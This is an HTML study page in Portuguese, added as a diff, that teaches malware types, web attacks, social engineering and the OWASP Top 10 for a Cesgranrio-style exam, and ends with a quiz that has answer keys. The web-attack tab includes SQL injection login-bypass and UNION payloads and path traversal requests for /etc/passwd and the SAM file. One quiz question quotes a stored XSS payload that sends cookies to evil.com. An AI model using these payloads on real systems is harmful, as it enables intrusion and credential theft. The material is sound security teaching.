@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="pt-BR" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ataques & Malwares | DigitalCron Petrobras</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800;900&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../assets/css/main.css">
+  <link rel="stylesheet" href="../../assets/css/materia.css">
+</head>
+<body>
+<div class="app-layout">
+  <div id="sidebar-placeholder"></div>
+  <div class="main-content" id="main-content">
+    <div id="navbar-placeholder"></div>
+
+    <div class="breadcrumb animate-fade-up">
+      <a href="../../dashboard.html">Dashboard</a><span class="sep">›</span>
+      <a href="index.html">Segurança da Informação</a><span class="sep">›</span>
+      <span>Ataques & Malwares</span>
+    </div>
+
+    <div class="materia-hero animate-fade-up delay-1">
+      <div class="materia-hero-content">
+        <div class="materia-tag">💥 Bloco III · 3.3 – 3.5</div>
+        <h1 class="mb-8">Ataques <span class="gradient-text">&amp; Malwares</span></h1>
+        <p>Softwares maliciosos (ransomware, vírus, worms, spyware, rootkit), ataques web (DDoS, SQLi, XSS, CSRF, Path Traversal) e técnicas de desenvolvimento seguro (SAST/DAST/IAST).</p>
+        <div class="materia-meta">
+          <div class="materia-meta-item"><span>⏱ ~50 min</span></div>
+          <div class="materia-meta-item"><span>🎯 Alta incidência</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="cesgranrio-box animate-fade-up delay-2">
+      <div class="cesgranrio-box-header"><span class="crown">👑</span><h4>Destaques Cesgranrio — Ataques</h4></div>
+      <ul>
+        <li>Worm se propaga sozinho pela rede; vírus precisa de hospedeiro; trojan precisa de ação do usuário</li>
+        <li>Stored XSS é persistente (armazenado no servidor); Reflected XSS é imediato (via URL)</li>
+        <li>CSRF usa a sessão autenticada do usuário — diferente do XSS que injeta script</li>
+        <li>SQL Injection: solução é Prepared Statement, não apenas validação de entrada</li>
+        <li>DDoS viola Disponibilidade; vazamento viola Confidencialidade; alteração viola Integridade</li>
+        <li>Engenharia social explora o fator humano — phishing é o tipo mais comum</li>
+      </ul>
+    </div>
+
+    <div class="tabs tab-group animate-fade-up delay-2">
+      <button class="tab-btn active" data-tab="malware">🦠 Malwares</button>
+      <button class="tab-btn" data-tab="ataquesweb">💉 Ataques Web</button>
+      <button class="tab-btn" data-tab="social">🎭 Engenharia Social</button>
+      <button class="tab-btn" data-tab="devseguro">🔒 Dev Seguro</button>
+      <button class="tab-btn" data-tab="simulado">✏️ Simulado</button>
+    </div>
+
+    <!-- Malwares -->
+    <div class="tab-panel active" data-tab="malware">
+      <div class="content-section animate-fade-up">
+        <h2><div class="section-icon" style="background:rgba(239,68,68,0.1)">🦠</div>Softwares Maliciosos</h2>
+
+        <div class="comparison-wrap">
+          <table class="comparison-table">
+            <thead><tr><th>Malware</th><th>Como se propaga</th><th>Ação principal</th><th>Pilar CID</th></tr></thead>
+            <tbody>
+              <tr>
+                <td><strong>Vírus</strong></td>
+                <td>Anexa-se a arquivos legítimos — propaga quando arquivo é executado pelo usuário</td>
+                <td>Corrompe/modifica arquivos, replica</td>
+                <td>Integridade</td>
+              </tr>
+              <tr>
+                <td><strong>Worm</strong></td>
+                <td>Auto-propaga pela rede SEM interação humana — explora vulnerabilidades de serviços</td>
+                <td>Consome recursos, instala backdoors, propaga outros malwares</td>
+                <td>Disponibilidade</td>
+              </tr>
+              <tr>
+                <td><strong>Trojan (Cavalo de Troia)</strong></td>
+                <td>Disfarçado de software legítimo — usuário instala voluntariamente</td>
+                <td>Abre backdoor, roubo de dados, download de outros malwares</td>
+                <td>Confidencialidade</td>
+              </tr>
+              <tr>
+                <td><strong>Ransomware</strong></td>
+                <td>Via email (phishing), exploit, download malicioso</td>
+                <td>Criptografa arquivos e exige resgate (geralmente criptomoeda)</td>
+                <td>Disponibilidade (+ Confidencialidade)</td>
+              </tr>
+              <tr>
+                <td><strong>Spyware</strong></td>
+                <td>Instalado junto com software gratuito (bundleware)</td>
+                <td>Monitora comportamento, captura senhas, histórico, keylogging</td>
+                <td>Confidencialidade</td>
+              </tr>
+              <tr>
+                <td><strong>Rootkit</strong></td>
+                <td>Via exploits, trojans ou instaladores comprometidos</td>
+                <td>Oculta presença de outros malwares, garante acesso privilegiado persistente</td>
+                <td>Confidencialidade + Integridade</td>
+              </tr>
+              <tr>
+                <td><strong>Adware</strong></td>
+                <td>Bundleware, downloads gratuitos</td>
+                <td>Exibe anúncios não solicitados, coleta dados de navegação</td>
+                <td>Confidencialidade</td>
+              </tr>
+              <tr>
+                <td><strong>Botnet</strong></td>
+                <td>Via worm, trojan ou exploit</td>
+                <td>Transforma o dispositivo em "zumbi" controlado remotamente (C&C) para DDoS, spam</td>
+                <td>Disponibilidade (de vítimas)</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="highlight-box gold">
+          <div class="hb-title">⭐ Distinção Chave — Vírus vs Worm vs Trojan</div>
+          <strong>Vírus:</strong> precisa de um arquivo HOSPEDEIRO para se anexar + ação do usuário para executar.<br>
+          <strong>Worm:</strong> independente, auto-propaga pela REDE sem hospedeiro e sem interação humana.<br>
+          <strong>Trojan:</strong> não se replica — parece legítimo mas executa ação maliciosa oculta. Depende do usuário instalar.<br><br>
+          Resumo: Vírus = arquivo; Worm = rede autônomo; Trojan = disfarce.
+        </div>
+
+        <h3>APT — Advanced Persistent Threat</h3>
+        <div class="highlight-box info">
+          <div class="hb-title">💡 APT — Ameaça Persistente Avançada</div>
+          Ataques sofisticados, geralmente patrocinados por estados, que permanecem ocultos por longo tempo (meses/anos) coletando dados estratégicos. Características: furtivos, direcionados, persistentes, com múltiplas fases (reconhecimento → comprometimento inicial → persistência → movimentação lateral → exfiltração).
+        </div>
+      </div>
+    </div>
+
+    <!-- Ataques Web -->
+    <div class="tab-panel" data-tab="ataquesweb">
+      <div class="content-section animate-fade-up">
+        <h2><div class="section-icon" style="background:rgba(139,92,246,0.1)">💉</div>Ataques a Aplicações Web</h2>
+
+        <div class="accordion">
+          <div class="accordion-item">
+            <div class="accordion-header"><span>💉 SQL Injection (SQLi)</span><svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></div>
+            <div class="accordion-body"><div class="accordion-content">
+              <p>Insere código SQL malicioso em campos de entrada para manipular queries do banco.</p>
+              <div class="code-block"><span class="code-lang">Exemplo de ataque</span><pre>-- Formulário de login vulnerável
+SELECT * FROM users WHERE user='$login' AND pass='$senha'
+
+-- Ataque: login = admin'--  (comenta o restante)
+SELECT * FROM users WHERE user='admin'--' AND pass=''
+-- Acesso sem senha!
+
+-- Ataque com UNION para exfiltrar dados
+' UNION SELECT username, password FROM users--</pre></div>
+              <div class="concept-grid" style="margin-top:12px">
+                <div class="concept-card"><div class="emoji">✅</div><div class="concept-name">Prevenção</div><div class="concept-desc">Prepared Statements / Parameterized Queries, ORM, validação de entrada, WAF, princípio do menor privilégio no banco.</div></div>
+                <div class="concept-card"><div class="emoji">🎯</div><div class="concept-name">Pilar violado</div><div class="concept-desc">Confidencialidade (exfiltração de dados) e Integridade (alteração/deleção de registros).</div></div>
+              </div>
+            </div></div>
+          </div>
+
+          <div class="accordion-item">
+            <div class="accordion-header"><span>🖥️ XSS — Cross-Site Scripting</span><svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></div>
+            <div class="accordion-body"><div class="accordion-content">
+              <p>Injeta scripts maliciosos em páginas web que são executados no navegador de outras vítimas.</p>
+              <div class="comparison-wrap">
+                <table class="comparison-table">
+                  <thead><tr><th>Tipo</th><th>Como funciona</th><th>Persistência</th></tr></thead>
+                  <tbody>
+                    <tr><td><strong>Stored (Persistente)</strong></td><td>Script salvo no banco de dados do servidor — executado a cada visualização da página</td><td>✅ Alta — afeta múltiplos usuários</td></tr>
+                    <tr><td><strong>Reflected</strong></td><td>Script na URL — retornado imediatamente na resposta do servidor</td><td>❌ Baixa — requer clicar no link malicioso</td></tr>
+                    <tr><td><strong>DOM-based</strong></td><td>Script manipula o DOM no cliente — não passa pelo servidor</td><td>❌ Baixa</td></tr>
+                  </tbody>
+                </table>
+              </div>
+              <p style="margin-top:12px"><strong>Prevenção:</strong> Output encoding (HTML entity encoding), Content Security Policy (CSP), validação de entrada, HttpOnly cookies.</p>
+            </div></div>
+          </div>
+
+          <div class="accordion-item">
+            <div class="accordion-header"><span>🔄 CSRF — Cross-Site Request Forgery</span><svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></div>
+            <div class="accordion-body"><div class="accordion-content">
+              <p>Engana um usuário autenticado a executar ações indesejadas em um site confiável.</p>
+              <div class="step-flow">
+                <div class="step-item"><div class="step-num" style="background:rgba(239,68,68,0.15);color:var(--red)">1</div><div class="step-content"><h4>Vítima está logada no banco.com</h4><p>Sessão autenticada com cookie válido.</p></div></div>
+                <div class="step-item"><div class="step-num" style="background:rgba(239,68,68,0.15);color:var(--red)">2</div><div class="step-content"><h4>Vítima visita site malicioso</h4><p>Site malicioso contém formulário ou imagem que faz requisição para banco.com.</p></div></div>
+                <div class="step-item"><div class="step-num" style="background:rgba(239,68,68,0.15);color:var(--red)">3</div><div class="step-content"><h4>Navegador envia cookie automaticamente</h4><p>banco.com recebe requisição com cookie válido → executa a ação (ex: transferência).</p></div></div>
+              </div>
+              <p><strong>Prevenção:</strong> CSRF token (token único por formulário), SameSite cookie attribute, verificar Origin/Referer header, re-autenticação para ações críticas.</p>
+              <div class="highlight-box info"><div class="hb-title">XSS vs CSRF</div>XSS injeta código que executa no navegador da vítima (atacante controla o browser). CSRF usa a sessão da vítima para fazer requisições não autorizadas em site legítimo (atacante não vê a resposta). XSS é do lado cliente; CSRF explora confiança do servidor.</div>
+            </div></div>
+          </div>
+
+          <div class="accordion-item">
+            <div class="accordion-header"><span>🌊 DDoS — Distributed Denial of Service</span><svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></div>
+            <div class="accordion-body"><div class="accordion-content">
+              <p>Inunda o alvo com tráfego de múltiplas origens (botnet) até tornar o serviço indisponível.</p>
+              <div class="comparison-wrap">
+                <table class="comparison-table">
+                  <thead><tr><th>Tipo</th><th>Vetor</th></tr></thead>
+                  <tbody>
+                    <tr><td><strong>Volumétrico</strong></td><td>Satura largura de banda (UDP flood, ICMP flood). Medido em Gbps.</td></tr>
+                    <tr><td><strong>Protocolo</strong></td><td>Explora fraquezas de protocolos (SYN flood — esgota conexões TCP).</td></tr>
+                    <tr><td><strong>Camada de Aplicação</strong></td><td>HTTP flood — requisições GET/POST em volume que esgotam recursos do servidor.</td></tr>
+                  </tbody>
+                </table>
+              </div>
+              <p style="margin-top:12px"><strong>Mitigação:</strong> CDN, scrubbing centers, rate limiting, anycast routing, WAF com proteção DDoS, black-holing.</p>
+            </div></div>
+          </div>
+
+          <div class="accordion-item">
+            <div class="accordion-header"><span>📁 Path Traversal</span><svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></div>
+            <div class="accordion-body"><div class="accordion-content">
+              <p>Acessa arquivos fora do diretório permitido usando sequências <code>../</code> (dot-dot-slash).</p>
+              <div class="code-block"><span class="code-lang">Exemplo</span><pre>-- URL vulnerável
+GET /download?file=report.pdf
+
+-- Ataque: navega para fora do diretório
+GET /download?file=../../../etc/passwd
+GET /download?file=..\..\windows\system32\config\sam
+
+-- Objetivo: acessar arquivos de configuração, senhas do sistema</pre></div>
+              <p><strong>Prevenção:</strong> Validar e sanitizar parâmetros de arquivo, usar caminhos absolutos resolvidos, whitelist de arquivos/extensões permitidos, nunca usar input do usuário diretamente em caminhos de arquivo.</p>
+            </div></div>
+          </div>
+
+          <div class="accordion-item">
+            <div class="accordion-header"><span>🤝 Man-in-the-Middle (MitM)</span><svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></div>
+            <div class="accordion-body"><div class="accordion-content">
+              <p>Atacante intercepta a comunicação entre duas partes sem que nenhuma perceba.</p>
+              <p><strong>Técnicas:</strong> ARP Spoofing (rede local), DNS Spoofing, SSL Stripping (downgrada HTTPS para HTTP).</p>
+              <p><strong>Viola:</strong> Confidencialidade (lê os dados) e Integridade (pode alterar os dados em trânsito).</p>
+              <p><strong>Prevenção:</strong> HTTPS + HSTS (HTTP Strict Transport Security), certificate pinning, VPN, verificar certificados digitais.</p>
+            </div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Engenharia Social -->
+    <div class="tab-panel" data-tab="social">
+      <div class="content-section animate-fade-up">
+        <h2><div class="section-icon" style="background:rgba(212,175,55,0.1)">🎭</div>Engenharia Social</h2>
+
+        <p>Engenharia social explora o <strong>fator humano</strong> — manipula pessoas para que revelem informações ou executem ações que comprometam a segurança. É frequentemente a porta de entrada de ataques sofisticados.</p>
+
+        <div class="comparison-wrap">
+          <table class="comparison-table">
+            <thead><tr><th>Técnica</th><th>Como funciona</th></tr></thead>
+            <tbody>
+              <tr><td><strong>Phishing</strong></td><td>Email fraudulento imitando entidade legítima (banco, Petrobras, Receita Federal) para roubar credenciais</td></tr>
+              <tr><td><strong>Spear Phishing</strong></td><td>Phishing direcionado a pessoa específica com informações personalizadas — mais convincente</td></tr>
+              <tr><td><strong>Whaling</strong></td><td>Spear phishing direcionado a executivos (CEO, CFO) — alto valor</td></tr>
+              <tr><td><strong>Vishing</strong></td><td>Phishing por voz — ligação telefônica fraudulenta</td></tr>
+              <tr><td><strong>Smishing</strong></td><td>Phishing por SMS</td></tr>
+              <tr><td><strong>Pretexting</strong></td><td>Cria cenário fictício para obter informações ("Sou do suporte, preciso da sua senha")</td></tr>
+              <tr><td><strong>Baiting</strong></td><td>Isca física (pendrive na recepção) ou digital (download gratuito com malware)</td></tr>
+              <tr><td><strong>Tailgating</strong></td><td>Acesso físico não autorizado seguindo funcionário legítimo por porta controlada</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="highlight-box info">
+          <div class="hb-title">💡 Por que engenharia social é tão eficaz?</div>
+          Explora características humanas: autoridade ("sou o gerente de TI"), urgência ("sua conta será bloqueada em 1h"), curiosidade, medo e confiança. A tecnologia é mais fácil de proteger do que as pessoas — daí a frase: "O elo mais fraco na segurança é o humano."
+        </div>
+      </div>
+    </div>
+
+    <!-- Dev Seguro -->
+    <div class="tab-panel" data-tab="devseguro">
+      <div class="content-section animate-fade-up">
+        <h2><div class="section-icon" style="background:rgba(16,185,129,0.1)">🔒</div>Desenvolvimento Seguro</h2>
+
+        <h3>OWASP Top 10</h3>
+        <p>Lista das 10 vulnerabilidades mais críticas em aplicações web, publicada pela OWASP (Open Web Application Security Project).</p>
+        <div class="comparison-wrap">
+          <table class="comparison-table">
+            <thead><tr><th>#</th><th>Vulnerabilidade</th><th>Exemplo</th></tr></thead>
+            <tbody>
+              <tr><td>A01</td><td><strong>Broken Access Control</strong></td><td>Usuário comum acessa funções de admin</td></tr>
+              <tr><td>A02</td><td><strong>Cryptographic Failures</strong></td><td>Dados sensíveis transmitidos sem criptografia</td></tr>
+              <tr><td>A03</td><td><strong>Injection</strong></td><td>SQL Injection, Command Injection, XSS</td></tr>
+              <tr><td>A04</td><td><strong>Insecure Design</strong></td><td>Falta de threat modeling na fase de design</td></tr>
+              <tr><td>A05</td><td><strong>Security Misconfiguration</strong></td><td>Credenciais padrão, portas desnecessárias abertas</td></tr>
+              <tr><td>A06</td><td><strong>Vulnerable Components</strong></td><td>Bibliotecas/frameworks desatualizados</td></tr>
+              <tr><td>A07</td><td><strong>Auth Failures</strong></td><td>Força bruta, sessões não expiradas</td></tr>
+              <tr><td>A08</td><td><strong>Software & Data Integrity Failures</strong></td><td>Pipeline CI/CD comprometido</td></tr>
+              <tr><td>A09</td><td><strong>Security Logging Failures</strong></td><td>Sem logs de tentativas de login</td></tr>
+              <tr><td>A10</td><td><strong>SSRF</strong></td><td>Server-Side Request Forgery</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Práticas de Desenvolvimento Seguro</h3>
+        <div class="concept-grid">
+          <div class="concept-card"><div class="emoji">🛡️</div><div class="concept-name">Menor Privilégio</div><div class="concept-desc">Cada componente tem apenas as permissões mínimas necessárias. BD: usuário da app sem permissão de DROP.</div></div>
+          <div class="concept-card"><div class="emoji">🔍</div><div class="concept-name">Validação de Entrada</div><div class="concept-desc">Validar TUDO que vem do cliente (tipo, tamanho, formato, range). Nunca confiar em input do usuário.</div></div>
+          <div class="concept-card"><div class="emoji">📝</div><div class="concept-name">Prepared Statements</div><div class="concept-desc">Parâmetros separados da query SQL — previne SQL Injection de forma definitiva.</div></div>
+          <div class="concept-card"><div class="emoji">🔒</div><div class="concept-name">Criptografia em Repouso/Trânsito</div><div class="concept-desc">HTTPS para dados em trânsito. AES-256 para dados armazenados. Hashing de senhas (bcrypt, Argon2).</div></div>
+          <div class="concept-card"><div class="emoji">🔑</div><div class="concept-name">Gestão Segura de Segredos</div><div class="concept-desc">Nunca hardcode de senhas no código. Usar cofres de segredos (HashiCorp Vault, AWS Secrets Manager).</div></div>
+          <div class="concept-card"><div class="emoji">📋</div><div class="concept-name">Threat Modeling</div><div class="concept-desc">STRIDE/DREAD na fase de design para identificar ameaças antes de codificar. Barato prevenir vs corrigir.</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Simulado -->
+    <div class="tab-panel" data-tab="simulado">
+      <div class="animate-fade-up">
+        <div class="section-header mb-16">
+          <div class="section-title"><span class="accent-dot"></span> Simulado — Ataques & Malwares</div>
+          <span class="badge badge-red">10 questões · Estilo Cesgranrio</span>
+        </div>
+        <div id="quiz-ataques"></div>
+      </div>
+    </div>
+
+    <div class="card animate-fade-up mt-24">
+      <div class="section-header"><div class="section-title"><span class="accent-dot"></span> Checklist</div></div>
+      <div id="checklist-ataques"></div>
+    </div>
+
+    <div class="topic-nav animate-fade-up">
+      <a href="operacao.html">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
+        <div><div style="font-size:0.72rem;color:var(--text-muted)">Anterior</div><div>Operação de Segurança</div></div>
+      </a>
+      <a href="identidade.html" class="next">
+        <div><div style="font-size:0.72rem;color:var(--text-muted)">Próximo</div><div>Identidade & Acesso</div></div>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
+      </a>
+    </div>
+  </div>
+</div>
+<div id="toast-container"></div>
+<script src="../../assets/js/app.js"></script>
+<script src="../../assets/js/layout.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', async () => {
+  await DC.Layout.init('../../');
+  DC.Accordion.init(); DC.Tabs.init();
+
+  DC.Checklist.init('checklist-ataques','ataques',[
+    'Sei distinguir Vírus, Worm e Trojan pela forma de propagação',
+    'Conheço ransomware, spyware, rootkit e botnet',
+    'Domino SQL Injection — ataque, impacto e prevenção (Prepared Statement)',
+    'Sei a diferença entre XSS Stored e XSS Reflected',
+    'Entendo como o CSRF usa a sessão autenticada da vítima',
+    'Sei a diferença entre XSS e CSRF',
+    'Conheço DDoS (volumétrico, protocolo, camada de aplicação)',
+    'Entendo Path Traversal e como prevenir',
+    'Conheço as técnicas de engenharia social (phishing, pretexting, baiting)',
+    'Conheço o OWASP Top 10 e as práticas de desenvolvimento seguro',
+  ]);
+
+  DC.Quiz.render('quiz-ataques',[
+    { question:'Um malware se propaga pela rede corporativa exploração vulnerabilidade no serviço SMB sem nenhuma interação dos usuários, infectando dezenas de servidores em minutos. Qual tipo de malware descreve esse comportamento?',
+      options:['Vírus — se anexa a arquivos e propaga com execução.','Trojan — disfarçado de software legítimo.','Ransomware — criptografa arquivos e exige resgate.','Worm — auto-propaga pela rede sem interação humana.','Rootkit — oculta presença no sistema.'],
+      answer:3, explanation:'Worm = propagação AUTÔNOMA pela rede, sem precisar de arquivo hospedeiro e sem interação do usuário. Explora vulnerabilidades em serviços de rede (ex: EternalBlue explorou SMB → WannaCry). O vírus precisa de hospedeiro + execução humana. Trojan precisa ser instalado pelo usuário. Rootkit oculta mas não se propaga por conta própria.' },
+    { question:'Um atacante injeta o script <script>document.location="http://evil.com/steal?c="+document.cookie</script> no campo de comentário de um portal corporativo. O script é armazenado no banco e executa para todos que acessam a página. Qual ataque é esse?',
+      options:['XSS Reflected — script retornado via URL.','SQL Injection — manipula o banco de dados.','CSRF — usa sessão autenticada do usuário.','XSS Stored (Persistente) — script armazenado e executado para múltiplos usuários.','Path Traversal — acessa arquivos não autorizados.'],
+      answer:3, explanation:'XSS Stored (Persistente): o script malicioso é ARMAZENADO no servidor (banco de dados do portal) e executado no navegador de TODOS os usuários que visitam a página infectada. O roubo de cookies permite sequestrar sessões. XSS Reflected seria via URL (não armazenado). CSRF usa sessão mas não injeta script. A persistência e impacto em múltiplos usuários são as características do Stored XSS.' },
+    { question:'O CSRF (Cross-Site Request Forgery) difere do XSS porque:',
+      options:['CSRF injeta scripts no navegador da vítima; XSS usa a sessão para fazer requisições.','XSS injeta scripts que executam no browser da vítima; CSRF usa a sessão autenticada da vítima para enviar requisições a um site confiável sem que ela perceba.','Ambos são variações do SQL Injection com foco diferente.','CSRF só funciona com HTTP; XSS só com HTTPS.','Não há diferença técnica relevante — são sinônimos.'],
+      answer:1, explanation:'XSS: injeta código JavaScript que executa no navegador da vítima — atacante controla o que o browser faz. CSRF: não injeta código — usa a sessão autenticada existente para fazer requisições que o servidor considera legítimas. XSS é ataque client-side. CSRF explora a confiança do servidor no browser autenticado. Defesas diferentes: CSP para XSS; CSRF token para CSRF.' },
+    { question:'A prevenção mais eficaz contra SQL Injection é:',
+      options:['Usar firewall para bloquear IPs suspeitos.','Validar o comprimento máximo dos campos de entrada.','Usar Prepared Statements (Parameterized Queries) que separam código SQL dos dados.','Criptografar o banco de dados com AES-256.','Fazer backup frequente do banco de dados.'],
+      answer:2, explanation:'Prepared Statements (Parameterized Queries) é a solução definitiva: o banco de dados trata parâmetros como DADOS, nunca como código SQL, independente do que o usuário digitar. Validação de entrada ajuda mas não é suficiente sozinha (pode ser bypassada). Firewall e criptografia não previnem SQLi. WAF ajuda como camada adicional mas não substitui código seguro.' },
+    { question:'Um ataque de DDoS volumétrico tem como objetivo principal:',
+      options:['Roubar dados confidenciais do servidor alvo.','Modificar registros no banco de dados da vítima.','Saturar a largura de banda ou recursos do servidor para tornar o serviço indisponível.','Injetar código malicioso na aplicação web do alvo.','Obter credenciais de administrador por força bruta.'],
+      answer:2, explanation:'DDoS volumétrico: inunda o alvo com tráfego massivo de múltiplas origens (botnet) — UDP flood, ICMP flood, amplificação DNS. Objetivo: esgotar largura de banda ou recursos de processamento → serviço indisponível. Viola DISPONIBILIDADE. Não rouba dados (Confidencialidade) nem modifica dados (Integridade). Mitigação: CDN, scrubbing center, anycast, rate limiting.' },
+    { question:'O ataque de Path Traversal (Directory Traversal) consiste em:',
+      options:['Injetar comandos SQL em parâmetros de URL.','Usar sequências "../" para navegar além do diretório raiz da aplicação e acessar arquivos não autorizados.','Interceptar o tráfego entre cliente e servidor na rede local.','Criar múltiplas requisições simultâneas para derrubar um serviço.','Falsificar endereços de e-mail para enganar o usuário.'],
+      answer:1, explanation:'Path Traversal: usa "../" (ou "../", "%2e%2e/", etc.) para sair do diretório raiz da aplicação. Ex: /download?file=../../../etc/passwd acessa o arquivo de senhas do Linux. Prevenção: validar e resolver o caminho real antes de usar (realpath()), whitelist de arquivos permitidos, nunca usar input do usuário diretamente em operações de arquivo.' },
+    { question:'O Ransomware WannaCry (2017) combinava características de qual tipo de malware para se propagar rapidamente?',
+      options:['Vírus + Trojan','Spyware + Adware','Ransomware + Worm (auto-propagação via SMB)','Rootkit + Backdoor','Botnet + DDoS'],
+      answer:2, explanation:'WannaCry era Ransomware (criptografava arquivos e exigia resgate) + Worm (explorava vulnerabilidade EternalBlue no protocolo SMB para se auto-propagar pela rede sem interação humana). Isso o tornou especialmente devastador — infectou 300.000 computadores em 150 países em horas. Mostrou como malwares modernos combinam múltiplas técnicas.' },
+    { question:'O Phishing Spear difere do Phishing comum porque:',
+      options:['Spear usa SMS; Phishing comum usa email.','Spear é direcionado a uma pessoa/organização específica com informações personalizadas; Phishing comum é enviado em massa sem personalização.','Spear é mais fácil de detectar que o Phishing comum.','Phishing comum é mais perigoso que o Spear.','Não há diferença técnica — são termos intercambiáveis.'],
+      answer:1, explanation:'Phishing comum: email genérico enviado em massa ("Caro cliente..."). Spear Phishing: ataque direcionado e personalizado — o atacante pesquisa a vítima (LinkedIn, redes sociais) e cria mensagem convincente ("Olá Ana, vi seu projeto de modernização do sistema ERP..."). Taxa de sucesso muito maior. Whaling é spear phishing direcionado a executivos C-level.' },
+    { question:'O Rootkit tem como característica principal:',
+      options:['Criptografar arquivos do usuário para exigir resgate.','Enviar spam e participar de ataques DDoS a partir do dispositivo infectado.','Ocultar sua presença e a de outros malwares, mantendo acesso privilegiado e persistente ao sistema.','Auto-propagar pela rede sem interação humana.','Monitorar teclas digitadas para roubar senhas.'],
+      answer:2, explanation:'Rootkit: projetado para se ESCONDER — modifica o sistema operacional (kernel, drivers) para ocultar processos, arquivos e conexões de rede maliciosas de ferramentas de detecção. Mantém acesso root/admin persistente ao sistema. Extremamente difícil de detectar e remover (às vezes requer reinstalação do SO). Nome vem de "root" (privilégio máximo) + "kit" (conjunto de ferramentas).' },
+    { question:'Qual prática de desenvolvimento seguro previne de forma mais eficaz ataques de SQL Injection?',
+      options:['Limitar o tamanho dos campos de entrada do formulário.','Usar Prepared Statements que tratam dados do usuário como parâmetros, nunca como código SQL.','Exigir HTTPS para todas as requisições.','Armazenar senhas com hash SHA-256.','Usar firewall de rede para bloquear requisições suspeitas.'],
+      answer:1, explanation:'Prepared Statements / Parameterized Queries: a query é compilada com espaços reservados para parâmetros. Os dados do usuário são enviados separadamente — o banco SEMPRE os trata como dados, jamais como código SQL. Não importa o que o usuário digitar: `admin\' OR 1=1--` será buscado literalmente, não interpretado como SQL. É a única defesa definitiva contra SQLi.' },
+  ],'ataques_simulado');
+});
+</script>
+</body>
+</html>
